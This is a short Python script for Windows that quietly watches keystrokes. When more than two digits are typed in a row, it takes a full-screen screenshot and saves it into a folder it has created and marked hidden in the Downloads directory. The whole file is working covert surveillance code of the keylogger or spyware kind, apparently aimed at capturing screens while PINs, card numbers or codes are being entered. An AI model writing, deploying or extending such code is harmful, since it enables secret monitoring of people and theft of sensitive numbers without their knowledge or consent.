import keyboard
from PIL import ImageGrab
import os
import ctypes


counter = 0
matches = 0
folder = "C:/Users/theas/Downloads/.hiddenFolder"
if not os.path.exists(folder):
    os.makedirs(folder)
    ctypes.windll.kernel32.SetFileAttributesW(folder, 0x02)
while True:
    event = keyboard.read_event()
    if event.event_type == keyboard.KEY_UP:
        if event.name.isdigit():
            counter += 1
        else:
            counter = 0
    if counter > 2:
        counter = 0
        print("gotcha!")
        img = ImageGrab.grab()
        img.save("C:/Users/theas/Downloads/.hiddenFolder/screenshot"+str(matches)+".png")
        matches += 1
